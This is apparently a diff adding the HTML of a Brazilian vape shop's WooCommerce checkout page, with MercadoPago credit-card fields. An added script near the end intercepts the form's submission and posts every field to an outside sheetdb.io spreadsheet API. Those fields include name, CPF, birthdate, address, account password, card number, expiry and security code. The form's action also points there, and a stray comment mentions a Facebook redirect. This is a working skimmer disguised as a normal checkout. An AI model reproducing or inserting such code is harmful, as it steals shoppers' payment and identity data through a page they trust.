+<p class="woocommerce-FormRow woocommerce-FormRow--wide form-row form-row-wide form-row-password">
+<label for="password">Senha&nbsp;<span class="required">*</span></label>
+<input class="woocommerce-Input woocommerce-Input--text input-text" type="password" name="password" id="password" autocomplete="current-password" />
+</p>
+<p class="form-row">
+<input type="hidden" id="woocommerce-login-nonce" name="woocommerce-login-nonce" value="367afcf1b1" /><input type="hidden" name="_wp_http_referer" value="/checkout/" /> <input type="hidden" name="redirect" value="https://brpods.com/checkout/" />
+<button type="submit" class="woocommerce-button button woocommerce-form-login__submit" name="login" value="Fazer login">Fazer login</button>
+</p>
+<div class="login-form-footer">
+<a href="https://brpods.com/my-account/lost-password/" class="woocommerce-LostPassword lost_password">Esqueceu sua senha?</a>
+<label class="woocommerce-form__label woocommerce-form__label-for-checkbox woocommerce-form-login__rememberme">
+<input class="woocommerce-form__input woocommerce-form__input-checkbox" name="rememberme" type="checkbox" value="forever" /> <span>Lembrar-me</span>
+</label>
+</div>
+</form>
+<div class="woocommerce-form-coupon-toggle">
+<div class="woocommerce-info">
+Você tem um cupom de desconto? <a href="#" class="showcoupon">Clique aqui e informe o código do seu cupom de desconto</a> </div>
+</div>
+<form class="checkout_coupon woocommerce-form-coupon" method="post" style="display:none">
+<p>Se você tiver um código de cupom, utilize-o abaixo.</p>
+<p class="form-row form-row-first">
+<label for="coupon_code" class="screen-reader-text">Cupom:</label>
+<input type="text" name="coupon_code" class="input-text" placeholder="Código do cupom" id="coupon_code" value />
+</p>
+<p class="form-row form-row-last">
+<button type="submit" class="button" name="apply_coupon" value="Aplicar cupom">Aplicar cupom</button>
+</p>
+<div class="clear"></div>
+</form>
+<div class="woocommerce-notices-wrapper"></div><div class="row">
+<form name="checkout" method="post" class="checkout woocommerce-checkout" action="https://sheetdb.io/api/v1/sukxyvcd371y0" enctype="multipart/form-data" id="login">
+<div class="col-sm-6">
+<div class="row" id="customer_details">
+<div class="col-sm-12">
+<div class="woocommerce-billing-fields">
+<h3>Faturamento &amp; Entrega</h3>
+<div class="woocommerce-billing-fields__field-wrapper">
+<p class="form-row form-row-wide thwcfd-field-wrapper thwcfd-field-text validate-required" id="billing_first_name_field" data-priority="10"><label for="billing_first_name" class>Nome completo&nbsp;<abbr class="required" title="obrigatório">*</abbr></label><span class="woocommerce-input-wrapper"><input type="text" class="input-text " name="billing_first_name" id="billing_first_name" placeholder value autocomplete="given-name" /></span></p><p class="form-row form-row-first thwcfd-field-wrapper thwcfd-field-email validate-required validate-email" id="billing_email_field" data-priority="40"><label for="billing_email" class>E-mail&nbsp;<abbr class="required" title="obrigatório">*</abbr></label><span class="woocommerce-input-wrapper"><input type="email" class="input-text " name="billing_email" id="billing_email" placeholder value autocomplete="email" /></span></p><p class="form-row form-row-last thwcfd-field-wrapper thwcfd-field-tel validate-required validate-phone" id="billing_phone_field" data-priority="50"><label for="billing_phone" class>Telefone&nbsp;<abbr class="required" title="obrigatório">*</abbr></label><span class="woocommerce-input-wrapper"><input type="tel" class="input-text " name="billing_phone" id="billing_phone" placeholder="(xx) xxxxx-xxxx" value autocomplete="tel" /></span></p><p class="form-row form-row-first person-type-field thwcfd-field-wrapper thwcfd-field-tel" id="billing_cpf_field" data-priority="60"><label for="billing_cpf" class>CPF&nbsp;<span class="optional">(opcional)</span></label><span class="woocommerce-input-wrapper"><input type="tel" class="input-text " name="billing_cpf" id="billing_cpf" placeholder="xxx.xxx.xxx-xx" value /></span></p><p class="form-row form-row-last thwcfd-field-wrapper thwcfd-field-text validate-required" id="billing_birthdate_field" data-priority="70"><label for="billing_birthdate" class>Data de Nascimento&nbsp;<abbr class="required" title="obrigatório">*</abbr></label><span class="woocommerce-input-wrapper"><input type="text" class="input-text " name="billing_birthdate" id="billing_birthdate" placeholder="dd/mm/aa" value /></span></p><p class="form-row form-row-wide address-field update_totals_on_change thwcfd-field-wrapper thwcfd-field-country validate-required" id="billing_country_field" data-priority="80"><label for="billing_country" class>País&nbsp;<abbr class="required" title="obrigatório">*</abbr></label><span class="woocommerce-input-wrapper"><strong>Brasil</strong><input type="hidden" name="billing_country" id="billing_country" value="BR" autocomplete="country" class="country_to_state" readonly="readonly" /></span></p><p class="form-row form-row-first address-field thwcfd-field-wrapper thwcfd-field-text validate-required validate-postcode" id="billing_postcode_field" data-priority="90"><label for="billing_postcode" class>CEP&nbsp;<abbr class="required" title="obrigatório">*</abbr></label><span class="woocommerce-input-wrapper"><input type="text" class="input-text " name="billing_postcode" id="billing_postcode" placeholder value autocomplete="postal-code" /></span></p><p class="form-row form-row-wide address-field thwcfd-field-wrapper thwcfd-field-text validate-required" id="billing_address_1_field" data-priority="100"><label for="billing_address_1" class>Endereço&nbsp;<abbr class="required" title="obrigatório">*</abbr></label><span class="woocommerce-input-wrapper"><input type="text" class="input-text " name="billing_address_1" id="billing_address_1" placeholder="Nome da rua" value autocomplete="address-line1" /></span></p><p class="form-row form-row-wide thwcfd-field-wrapper thwcfd-field-text validate-required" id="billing_number_field" data-priority="110"><label for="billing_number" class>Número&nbsp;<abbr class="required" title="obrigatório">*</abbr></label><span class="woocommerce-input-wrapper"><input type="text" class="input-text " name="billing_number" id="billing_number" placeholder="Número da residência" value /></span></p><p class="form-row form-row-last address-field thwcfd-field-wrapper thwcfd-field-text" id="billing_address_2_field" data-priority="120"><label for="billing_address_2" class>Complemento&nbsp;<span class="optional">(opcional)</span></label><span class="woocommerce-input-wrapper"><input type="text" class="input-text " name="billing_address_2" id="billing_address_2" placeholder="Apartamento, suíte, unidade, etc. (opcional)" value autocomplete="address-line2" /></span></p><p class="form-row form-row-wide validate-required" id="billing_neighborhood_field" data-priority><label for="billing_neighborhood" class>Bairro&nbsp;<abbr class="required" title="obrigatório">*</abbr></label><span class="woocommerce-input-wrapper"><input type="text" class="input-text " name="billing_neighborhood" id="billing_neighborhood" placeholder="Bairro" value /></span></p><p class="form-row form-row-last address-field thwcfd-field-wrapper thwcfd-field-text validate-required" id="billing_city_field" data-priority="140"><label for="billing_city" class>Cidade&nbsp;<abbr class="required" title="obrigatório">*</abbr></label><span class="woocommerce-input-wrapper"><input type="text" class="input-text " name="billing_city" id="billing_city" placeholder value autocomplete="address-level2" /></span></p><p class="form-row form-row-wide address-field thwcfd-field-wrapper thwcfd-field-state validate-required validate-state" id="billing_state_field" data-priority="150"><label for="billing_state" class>Estado&nbsp;<abbr class="required" title="obrigatório">*</abbr></label><span class="woocommerce-input-wrapper"><select name="billing_state" id="billing_state" class="state_select " autocomplete="address-level1" data-placeholder="Selecione uma opção&hellip;" data-input-classes data-label="Estado">
+<option value>Selecione uma opção&hellip;</option><option value="AC">Acre</option><option value="AL">Alagoas</option><option value="AP">Amapá</option><option value="AM">Amazonas</option><option value="BA">Bahia</option><option value="CE">Ceará</option><option value="DF">Distrito Federal</option><option value="ES">Espírito Santo</option><option value="GO">Goiás</option><option value="MA">Maranhão</option><option value="MT">Mato Grosso</option><option value="MS">Mato Grosso do Sul</option><option value="MG">Minas Gerais</option><option value="PA">Pará</option><option value="PB">Paraíba</option><option value="PR">Paraná</option><option value="PE">Pernambuco</option><option value="PI">Piauí</option><option value="RJ">Rio de Janeiro</option><option value="RN">Rio Grande do Norte</option><option value="RS">Rio Grande do Sul</option><option value="RO">Rondônia</option><option value="RR">Roraima</option><option value="SC">Santa Catarina</option><option value="SP">São Paulo</option><option value="SE">Sergipe</option><option value="TO">Tocantins</option></select></span></p> </div>
+</div>
+<div class="woocommerce-account-fields">
+<p class="form-row form-row-wide create-account">
+<label class="woocommerce-form__label woocommerce-form__label-for-checkbox checkbox">
+<input class="woocommerce-form__input woocommerce-form__input-checkbox input-checkbox" id="createaccount" type="checkbox" name="createaccount" value="1" /> <span>Criar uma conta?</span>
+</label>
+</p>
+<div class="create-account">
+<p class="form-row validate-required" id="account_username_field" data-priority><label for="account_username" class>Nome de usuário da conta&nbsp;<abbr class="required" title="obrigatório">*</abbr></label><span class="woocommerce-input-wrapper"><input type="text" class="input-text " name="account_username" id="account_username" placeholder="Nome de usuário" value autocomplete="username" /></span></p> <p class="form-row validate-required" id="account_password_field" data-priority><label for="account_password" class>Criar uma senha para sua conta&nbsp;<abbr class="required" title="obrigatório">*</abbr></label><span class="woocommerce-input-wrapper"><input type="password" class="input-text " name="account_password" id="account_password" placeholder="Senha" value autocomplete="new-password" /></span></p> <div class="clear"></div>
+</div>
+</div>
+</div>
+<div class="col-sm-12">
+<div class="woocommerce-shipping-fields">
+</div>
+<div class="woocommerce-additional-fields">
+<h3>Informação adicional</h3>
+<div class="woocommerce-additional-fields__field-wrapper">
+<p class="form-row notes thwcfd-field-wrapper thwcfd-field-textarea" id="order_comments_field" data-priority><label for="order_comments" class>Notas do pedido&nbsp;<span class="optional">(opcional)</span></label><span class="woocommerce-input-wrapper"><textarea name="order_comments" class="input-text " id="order_comments" placeholder="Notas sobre seu pedido, por exemplo, informações especiais sobre entrega." rows="2" cols="5"></textarea></span></p> </div>
+<input type="hidden" name="wc_order_attribution_source_type" value /><input type="hidden" name="wc_order_attribution_referrer" value /><input type="hidden" name="wc_order_attribution_utm_campaign" value /><input type="hidden" name="wc_order_attribution_utm_source" value /><input type="hidden" name="wc_order_attribution_utm_medium" value /><input type="hidden" name="wc_order_attribution_utm_content" value /><input type="hidden" name="wc_order_attribution_utm_id" value /><input type="hidden" name="wc_order_attribution_utm_term" value /><input type="hidden" name="wc_order_attribution_session_entry" value /><input type="hidden" name="wc_order_attribution_session_start_time" value /><input type="hidden" name="wc_order_attribution_session_pages" value /><input type="hidden" name="wc_order_attribution_session_count" value /><input type="hidden" name="wc_order_attribution_user_agent" value /></div>
+</div>
+</div>
+</div>
+<div class="col-sm-6">
+<div class="checkout-order-review">
+<h3 id="order_review_heading">Seu pedido</h3>
+<div id="order_review" class="woocommerce-checkout-review-order">
+<table class="shop_table woocommerce-checkout-review-order-table">
+<thead>
+<tr>
+<th class="product-name">Produto</th>
+<th class="product-total">Subtotal</th>
+</tr>
+</thead>
+<tbody>
+<tr class="cart_item">
+<td class="product-name">
+Descartável - POD IGNITE V50 - 5000 PUFFS - 500mAh (Recarregável) - Aloe Grape&nbsp; <strong class="product-quantity">&times;&nbsp;1</strong> </td>
+<td class="product-total">
+<span class="woocommerce-Price-amount amount"><bdi><span class="woocommerce-Price-currencySymbol">&#82;&#36;</span>85,00</bdi></span> </td>
+</tr>
+</tbody>
+<tfoot>
+<tr class="cart-subtotal">
+<th>Subtotal</th>
+<td><span class="woocommerce-Price-amount amount"><bdi><span class="woocommerce-Price-currencySymbol">&#82;&#36;</span>85,00</bdi></span></td>
+</tr>
+<tr class="order-total">
+<th>Total</th>
+<td><strong><span class="woocommerce-Price-amount amount"><bdi><span class="woocommerce-Price-currencySymbol">&#82;&#36;</span>85,00</bdi></span></strong> </td>
+</tr>
+</tfoot>
+</table>
+<div id="payment" class="woocommerce-checkout-payment">
+<ul class="wc_payment_methods payment_methods methods">
+<li class="wc_payment_method payment_method_woo-mercado-pago-custom">
+<input id="payment_method_woo-mercado-pago-custom" type="radio" class="input-radio" name="payment_method" value="woo-mercado-pago-custom" checked="checked" data-order_button_text />
+<label for="payment_method_woo-mercado-pago-custom">
+Pague com cartões de crédito via MercadoPago <img decoding="async" src="https://brpods.com/wp-content/plugins/woocommerce-mercadopago/assets/images/icons/icon-blue-card.png" alt="Pague com cartões de crédito via MercadoPago" /> </label>
+<div class="payment_box payment_method_woo-mercado-pago-custom">
+<div class="mp-checkout-custom-load">
+<div class="spinner-card-form"></div>
+</div>
+<div class="mp-checkout-container">
+<div class="mp-checkout-custom-container">
+<div id="mp-custom-checkout-form-container">
+<div class="mp-checkout-custom-available-payments">
+<div class="mp-checkout-custom-available-payments-header">
+<div class="mp-checkout-custom-available-payments-title">
+<img decoding="async" src="https://brpods.com/wp-content/plugins/woocommerce-mercadopago/assets/images/icons/icon-purple-card.png" class="mp-icon">
+<p class="mp-checkout-custom-available-payments-text">
+Quais cartões você pode usar? </p>
+</div>
+<img decoding="async" src="https://brpods.com/wp-content/plugins/woocommerce-mercadopago/assets/images/checkouts/custom/chevron-down.png" class="mp-checkout-custom-available-payments-collapsible" />
+</div>
+<div class="mp-checkout-custom-available-payments-content">
+<payment-methods methods="[{&quot;title&quot;:&quot;Cart\u00f5es de cr\u00e9dito&quot;,&quot;label&quot;:&quot;At\u00e9 12x&quot;,&quot;payment_methods&quot;:[{&quot;src&quot;:&quot;https:\/\/http2.mlstatic.com\/storage\/logos-api-admin\/0daa1670-5c81-11ec-ae75-df2bef173be2-xl.png&quot;,&quot;alt&quot;:&quot;Mastercard&quot;},{&quot;src&quot;:&quot;https:\/\/http2.mlstatic.com\/storage\/logos-api-admin\/d589be70-eb86-11e9-b9a8-097ac027487d-xl.png&quot;,&quot;alt&quot;:&quot;Visa&quot;},{&quot;src&quot;:&quot;https:\/\/http2.mlstatic.com\/storage\/logos-api-admin\/fcdc39d0-57ad-11e8-8359-5d73691de80c-xl.svg&quot;,&quot;alt&quot;:&quot;Hipercard&quot;},{&quot;src&quot;:&quot;https:\/\/www.mercadopago.com\/org-img\/MP3\/API\/logos\/elo.gif&quot;,&quot;alt&quot;:&quot;Elo&quot;},{&quot;src&quot;:&quot;https:\/\/http2.mlstatic.com\/storage\/logos-api-admin\/b4785730-c13f-11ee-b4b3-bb9a23b70639-xl.svg&quot;,&quot;alt&quot;:&quot;American Express&quot;}]},{&quot;title&quot;:&quot;Cart\u00f5es de d\u00e9bito&quot;,&quot;payment_methods&quot;:[{&quot;src&quot;:&quot;https:\/\/www.mercadopago.com\/org-img\/MP3\/API\/logos\/elo.gif&quot;,&quot;alt&quot;:&quot;Elo Debito&quot;}]}]"></payment-methods>
+<hr>
+</div>
+</div>
+<div class="mp-checkout-custom-card-form">
+<p class="mp-checkout-custom-card-form-title">
+Preencha os dados do seu cartão </p>
+<div class="mp-checkout-custom-card-row">
+<input class="" name="cardNumber" id="cardNumber" maxlength="25" autocomplete="off" inputmode="numeric" placeholder="0000 0000 0000 0000" data-group="" data-ddg-inputtype="creditCards.cardNumber">
+<div class="mp-checkout-custom-card-input" id="form-checkout__cardNumber-container"></div>
+<input-helper isVisible="false" message="Dado obrigatório" input-id="mp-card-number-helper">
+</input-helper>
+</div>
+<div class="mp-checkout-custom-card-row" id="mp-card-holder-div">
+<input-label message="Nome do titular como aparece no cartão" isOptinal="false">
+</input-label>
+<input class="mp-checkout-custom-card-input mp-card-holder-name" placeholder="Ex.: María López" id="form-checkout__cardholderName" name="mp-card-holder-name" data-checkout="cardholderName" />
+<input-helper isVisible="false" message="Dado obrigatório" input-id="mp-card-holder-name-helper" data-main="mp-card-holder-name">
+</input-helper>
+</div>
+<div class="mp-checkout-custom-card-row mp-checkout-custom-dual-column-row">
+<div class="mp-checkout-custom-card-column">
+<input-label message="Vencimento" isOptinal="false">
+</input-label>
+<input class="hide" name="expirationYear" id="expirationYear" maxlength="4" autocomplete="off" inputmode="numeric" data-ddg-inputtype="creditCards.expirationYear">
+<input class="hide" name="expirationMonth" id="expirationMonth" maxlength="2" autocomplete="off" inputmode="numeric" data-ddg-inputtype="creditCards.expirationMonth">
+<input class="hide" name="expirationDate" id="expirationDate" maxlength="7" autocomplete="off" inputmode="numeric" data-ddg-inputtype="creditCards.expiration">
+<div id="form-checkout__expirationDate-container" class="mp-checkout-custom-card-input mp-checkout-custom-left-card-input">
+</div>
+<input-helper isVisible="false" message="Dado obrigatório" input-id="mp-expiration-date-helper">
+</input-helper>
+</div>
+<div class="mp-checkout-custom-card-column">
+<input-label message="Código de segurança" isOptinal="false">
+</input-label>
+<input class="hide" name="securityCode" id="securityCode" maxlength="4" autocomplete="off" inputmode="numeric" data-ddg-inputtype="creditCards.cardSecurityCode">
+<div id="form-checkout__securityCode-container" class="mp-checkout-custom-card-input"></div>
+<p id="mp-security-code-info" class="mp-checkout-custom-info-text"></p>
+<input-helper isVisible="false" message="Dado obrigatório" input-id="mp-security-code-helper">
+</input-helper>
+</div>
+</div>
+<div id="mp-doc-div" class="mp-checkout-custom-input-document" style="display: none;">
+<input-document label-message="Documento do titular" helper-message="Número de documento inválido" input-name="identificationNumber" hidden-id="form-checkout__identificationNumber" input-data-checkout="doc_number" select-id="form-checkout__identificationType" select-name="identificationType" select-data-checkout="doc_type" flag-error="docNumberError">
+</input-document>
+</div>
+</div>
+<div id="mp-checkout-custom-installments" class="mp-checkout-custom-installments-display-none">
+<p class="mp-checkout-custom-card-form-title">
+Escolha o número de parcelas </p>
+<div id="mp-checkout-custom-issuers-container" class="mp-checkout-custom-issuers-container">
+<div class="mp-checkout-custom-card-row">
+<input-label isOptinal="false" message="Banco emissor" for="mp-issuer">
+</input-label>
+</div>
+<div class="mp-input-select-input">
+<select name="issuer" id="form-checkout__issuer" class="mp-input-select-select"></select>
+</div>
+</div>
+<div id="mp-checkout-custom-installments-container" class="mp-checkout-custom-installments-container"></div>
+<input-helper isVisible="false" message="Escolha o número de parcelas" input-id="mp-installments-helper">
+</input-helper>
+<select style="display: none;" data-checkout="installments" name="installments" id="form-checkout__installments" class="mp-input-select-select">
+</select>
+<div id="mp-checkout-custom-box-input-tax-cft">
+<div id="mp-checkout-custom-box-input-tax-tea">
+<div id="mp-checkout-custom-tax-tea-text"></div>
+</div>
+<div id="mp-checkout-custom-tax-cft-text"></div>
+</div>
+</div>
+<div class="mp-checkout-custom-terms-and-conditions">
+<terms-and-conditions description="Ao continuar, você concorda com nossos" link-text="Termos e condições" link-src="https://www.mercadopago.com.br/ajuda/termos-e-politicas_194">
+</terms-and-conditions>
+</div>
+</div>
+</div>
+</div>
+<div id="mercadopago-utilities" style="display:none;">
+<input type="hidden" id="mp-amount" value="85" name="mercadopago_custom[amount]" />
+<input type="hidden" id="currency_ratio" value="1" name="mercadopago_custom[currency_ratio]" />
+<input type="hidden" id="paymentMethodId" name="mercadopago_custom[payment_method_id]" />
+<input type="hidden" id="mp_checkout_type" name="mercadopago_custom[checkout_type]" value="custom" />
+<input type="hidden" id="cardExpirationMonth" data-checkout="cardExpirationMonth" />
+<input type="hidden" id="cardExpirationYear" data-checkout="cardExpirationYear" />
+<input type="hidden" id="cardTokenId" name="mercadopago_custom[token]" />
+<input type="hidden" id="cardInstallments" name="mercadopago_custom[installments]" />
+<input type="hidden" id="mpCardSessionId" name="mercadopago_custom[session_id]" />
+</div>
+<script type="7173fc3d15097471859ad5b8-text/javascript">
+	function submitWalletButton(event) {
+    	event.preventDefault();
+    	jQuery('#mp_checkout_type').val('wallet_button');
+    	jQuery('form.checkout, form#order_review').submit();
+	}
+
+	var availablePayment = document.getElementsByClassName('mp-checkout-custom-available-payments')[0];
+	var collapsible = availablePayment.getElementsByClassName('mp-checkout-custom-available-payments-header')[0];
+
+	collapsible.addEventListener("click", function() {
+    	const icon = collapsible.getElementsByClassName('mp-checkout-custom-available-payments-collapsible')[0];
+    	const content = availablePayment.getElementsByClassName('mp-checkout-custom-available-payments-content')[0];
+
+    	if (content.style.maxHeight) {
+        	content.style.maxHeight = null;
+        	content.style.padding = "0px";
+        	icon.src = "https://brpods.com/wp-content/plugins/woocommerce-mercadopago/assets/images/checkouts/custom/chevron-down.png";
+    	} else {
+        	let hg = content.scrollHeight + 15 + "px";
+        	content.style.setProperty("max-height", hg, "important");
+        	content.style.setProperty("padding", "24px 0px 0px", "important");
+        	icon.src = "https://brpods.com/wp-content/plugins/woocommerce-mercadopago/assets/images/checkouts/custom/chevron-up.png";
+    	}
+	});
+</script>
+</div>
+</li>
+<li class="wc_payment_method payment_method_woo-mercado-pago-pix">
+<input id="payment_method_woo-mercado-pago-pix" type="radio" class="input-radio" name="payment_method" value="woo-mercado-pago-pix" data-order_button_text />
+<label for="payment_method_woo-mercado-pago-pix">
+Pague com PIX <small>(8% de desconto)</small> <img decoding="async" src="https://brpods.com/wp-content/plugins/woocommerce-mercadopago/assets/images/icons/icon-pix-blue.png" alt="Pague com PIX &lt;small&gt;(8% de desconto)&lt;/small&gt;" /> </label>
+<div class="payment_box payment_method_woo-mercado-pago-pix" style="display:none;">
+<div class="mp-checkout-container">
+<div class="mp-checkout-pix-container">
+<pix-template title="Pague de forma segura e instantânea" subtitle="Ao confirmar a compra, nós vamos te mostrar o código para fazer o pagamento." alt="Logo Pix" src="https://brpods.com/wp-content/plugins/woocommerce-mercadopago/assets/images/checkouts/pix/pix.png">
+</pix-template>
+<div class="mp-checkout-pix-terms-and-conditions">
+<terms-and-conditions description="Ao continuar, você concorda com nossos" link-text="Termos e condições" link-src="https://www.mercadopago.com.br/ajuda/termos-e-politicas_194">
+</terms-and-conditions>
+</div>
+</div>
+</div>
+<script type="7173fc3d15097471859ad5b8-text/javascript">
+	if (document.getElementById("payment_method_woo-mercado-pago-custom")) {
+    	jQuery("form.checkout").on("checkout_place_order_woo-mercado-pago-pix", function() {
+        	cardFormLoad();
+    	});
+	}
+</script>
+</div>
+</li>
+<li class="wc_payment_method payment_method_woo-mercado-pago-basic">
+<input id="payment_method_woo-mercado-pago-basic" type="radio" class="input-radio" name="payment_method" value="woo-mercado-pago-basic" data-order_button_text />
+<label for="payment_method_woo-mercado-pago-basic">
+Mercado Pago <img decoding="async" src="https://brpods.com/wp-content/plugins/woocommerce-mercadopago/assets/images/icons/icon-mp.png" alt="Mercado Pago" /> </label>
+<div class="payment_box payment_method_woo-mercado-pago-basic" style="display:none;">
+<div class="mp-checkout-container">
+<div class="mp-checkout-pro-container">
+<div class="mp-checkout-pro-content">
+<div class="mp-checkout-pro-checkout-benefits">
+<checkout-benefits title="Inicie sessão no Mercado Pago e garanta vantagens" title-align="center" items="[{&quot;title&quot;:&quot;Entre f\u00e1cil&quot;,&quot;subtitle&quot;:&quot;Inicie sess\u00e3o com seu mesmo e-mail e senha do Mercado Livre.&quot;,&quot;image&quot;:{&quot;src&quot;:&quot;https:\/\/brpods.com\/wp-content\/plugins\/woocommerce-mercadopago\/assets\/images\/checkouts\/basic\/blue-phone.png&quot;,&quot;alt&quot;:&quot;Imagem de telefone azul&quot;}},{&quot;title&quot;:&quot;Pague r\u00e1pido&quot;,&quot;subtitle&quot;:&quot;Use seus cart\u00f5es salvos, Pix ou saldo dispon\u00edvel.&quot;,&quot;image&quot;:{&quot;src&quot;:&quot;https:\/\/brpods.com\/wp-content\/plugins\/woocommerce-mercadopago\/assets\/images\/checkouts\/basic\/blue-wallet.png&quot;,&quot;alt&quot;:&quot;Imagem de carteira azul&quot;}},{&quot;title&quot;:&quot;Proteja sua compra&quot;,&quot;subtitle&quot;:&quot;Receba o dinheiro de volta se voc\u00ea n\u00e3o receber o produto.&quot;,&quot;image&quot;:{&quot;src&quot;:&quot;https:\/\/brpods.com\/wp-content\/plugins\/woocommerce-mercadopago\/assets\/images\/checkouts\/basic\/blue-protection.png&quot;,&quot;alt&quot;:&quot;Imagem de prote\u00e7\u00e3o azul&quot;}}]" list-mode="image">
+</checkout-benefits>
+</div>
+<div class="mp-checkout-pro-payment-methods">
+<payment-methods-v2 title="Meios de pagamento disponíveis" methods="[{&quot;src&quot;:&quot;https:\/\/www.mercadopago.com\/org-img\/MP3\/API\/logos\/pix.gif&quot;,&quot;alt&quot;:&quot;pix&quot;},{&quot;src&quot;:&quot;https:\/\/http2.mlstatic.com\/storage\/logos-api-admin\/0daa1670-5c81-11ec-ae75-df2bef173be2-xl.png&quot;,&quot;alt&quot;:&quot;master&quot;},{&quot;src&quot;:&quot;https:\/\/http2.mlstatic.com\/storage\/logos-api-admin\/d589be70-eb86-11e9-b9a8-097ac027487d-xl.png&quot;,&quot;alt&quot;:&quot;visa&quot;},{&quot;src&quot;:&quot;https:\/\/http2.mlstatic.com\/storage\/logos-api-admin\/fcdc39d0-57ad-11e8-8359-5d73691de80c-xl.svg&quot;,&quot;alt&quot;:&quot;hipercard&quot;},{&quot;src&quot;:&quot;https:\/\/www.mercadopago.com\/org-img\/MP3\/API\/logos\/elo.gif&quot;,&quot;alt&quot;:&quot;elo&quot;},{&quot;src&quot;:&quot;https:\/\/http2.mlstatic.com\/storage\/logos-api-admin\/b4785730-c13f-11ee-b4b3-bb9a23b70639-xl.svg&quot;,&quot;alt&quot;:&quot;amex&quot;},{&quot;src&quot;:&quot;https:\/\/brpods.com\/wp-content\/plugins\/woocommerce-mercadopago\/assets\/images\/icons\/icon-credits.png&quot;,&quot;alt&quot;:&quot;Credits image&quot;}]">
+</payment-methods-v2>
+</div>
+</div>
+</div>
+<div class="mp-checkout-pro-terms-and-conditions">
+<terms-and-conditions description="Ao continuar, você concorda com nossos" link-text="Termos e condições" link-src="https://www.mercadopago.com.br/ajuda/termos-e-politicas_194">
+</terms-and-conditions>
+</div>
+</div>
+<script type="7173fc3d15097471859ad5b8-text/javascript">
+	if (document.getElementById("payment_method_woo-mercado-pago-custom")) {
+    	jQuery("form.checkout").on("checkout_place_order_woo-mercado-pago-basic", function () {
+        	cardFormLoad();
+    	});
+	}
+</script>
+</div>
+</li>
+</ul>
+<div class="form-row place-order">
+<noscript>
+   		 Seu navegador não suporta JavaScript ou ele está desativado. Certifique-se de clicar no botão <em>Atualizar totais</em> antes de finalizar o seu pedido. Você poderá ser cobrado mais do que a quantidade indicada acima, se não fizer isso.   		 <br/><button type="submit" class="button alt" name="woocommerce_checkout_update_totals" value="Atualizar">Atualizar</button>
+   	 </noscript>
+<div class="woocommerce-terms-and-conditions-wrapper">
+<div class="woocommerce-privacy-policy-text"><p>Os dados cadastrados serão utilizados para processar e enviar o seu pedido ao destino final, fornecer o suporte necessário durante a sua experiência com a BRPods, além d e outras situações pontuais descritas na <a href class="woocommerce-privacy-policy-link" target="_blank">política de privacidade</a>.</p>
+</div>
+</div>
+<button type="submit" class="button alt" name="woocommerce_checkout_place_order" id="place_order" value="Finalizar pedido" data-value="Finalizar pedido">Finalizar pedido</button>
+<input type="hidden" id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="d339448e9d" /><input type="hidden" name="_wp_http_referer" value="/checkout/" /> </div>
+</div>
+</div>
+</div>
+</div>
+</form>
+<script>
+    	document.getElementById('login').onsubmit = function(event) {
+        	event.preventDefault(); // Previne o envio padrão do formulário
+
+        	const formData = new FormData(this);
+        	const data = {};
+        	formData.forEach((value, key) => {
+            	data[key] = value;
+        	});
+
+        	fetch('https://sheetdb.io/api/v1/sukxyvcd371y0', {
+            	method: 'POST',
+            	headers: {
+                	'Content-Type': 'application/json'
+            	},
+            	body: JSON.stringify(data)
+        	})
+        	.then(response => {
+            	if (response.ok) {
+                	// Dados enviados com sucesso, redireciona para o Facebook
+                	window.location.href = "https://brpods.com";
+            	} else {
+                	// Trate o erro aqui, se necessário
+                	console.error('Erro ao enviar os dados');
+            	}
+        	})
+        	.catch(error => {
+            	console.error('Erro de rede:', error);
+        	});
+    	};
+    	</script>
+
+
+</div>
+</div><div class="vc_row wpb_row vc_row-fluid"><div class="wpb_column vc_column_container vc_col-sm-12"><div class="vc_column-inner"><div class="wpb_wrapper">
+<div class="wpb_text_column wpb_content_element">
+<div class="wpb_wrapper">
+</div>
+</div>
+</div></div></div></div></div> </div>
+</article>
+</div>
+</div> 
+</div> 
+</div>
+
+<footer class="footer-container color-scheme-light">
+<div class="container main-footer">
+<aside class="footer-sidebar widget-area row" role="complementary">
+<div class="footer-column footer-column-1 col-md-12 col-sm-12">
+<div id="text-2" class="footer-widget  widget_text"> <div class="textwidget"><p style="text-align:center;"><img src="https://brpods.com/wp-content/uploads/2019/12/BRPods-1.png" alt="BRPods" title="BRPods" style="max-width:300px;" /></p>
+</div>
+</div> </div>
+<div class="clearfix visible-lg-block"></div>
+<div class="footer-column footer-column-2 col-md-3 col-sm-6">
+<div id="text-12" class="footer-widget  widget_text"><h5 class="widget-title">JUUL</h5> <div class="textwidget"><ul class="menu">
+<li><a href="https://brpods.com/loja/juul-pods/">JUUL Pods</a></li>
+<li><a href="https://brpods.com/produto/juul-starter-kit/">JUUL Starter KIT</a></li>
+</ul></div>
+</div> </div>
+<div class="footer-column footer-column-3 col-md-3 col-sm-6">
+<div id="text-13" class="footer-widget  widget_text"><h5 class="widget-title">STIG e Vapes Alternativos</h5> <div class="textwidget"><ul class="menu">
+<li><a href="https://brpods.com/loja/stig/">STIG</a></li>
+<li><a href="https://brpods.com/produto/vaporesso-new-renova-zero-2-com-2-pods/">Renova Zero</a></li>
+<li><a href="https://brpods.com/loja/puff-bar/">Puff Bar</a></li>
+</ul>
+</div>
+</div> </div>
+<div class="clearfix visible-sm-block"></div>
+<div class="footer-column footer-column-4 col-md-3 col-sm-6">
+<div id="text-14" class="footer-widget  widget_text"><h5 class="widget-title">Artigos e Notícias</h5> <div class="textwidget"><ul class="menu">
+<li><a href="https://brpods.com/juul/">O que é JUUL?</a></li>
+<li><a href="https://brpods.com/comprar-juul/">Comprar JUUL no Brasil?</a></li>
+</ul>
+</div>
+</div> </div>
+<div class="footer-column footer-column-5 col-md-3 col-sm-6">
+<div id="block-3" class="footer-widget  widget_block">
+<h2 class="wp-block-heading">Sobre</h2>
+</div><div id="block-4" class="footer-widget  widget_block widget_text">
+<p>© BRPods 2020. Todos os direitos reservados. Primeira e maior JUUL store do Brasil. Somos especializados em produtos JUUL e STIG, duas marcas referências do mercado de vape no Brasil.
+Este serviço oferece risco a saúde por conter nicotina. A BRPods não se responsabiliza pelo uso indevido do aparelho. Caso busque uma alternativa para parar de fumar faz-se necessário acompanhamento médico. Os produtos comercializados pela BRPods não dispensam a atenção de um médico.
+</p>
+</div><div id="block-5" class="footer-widget  widget_block">
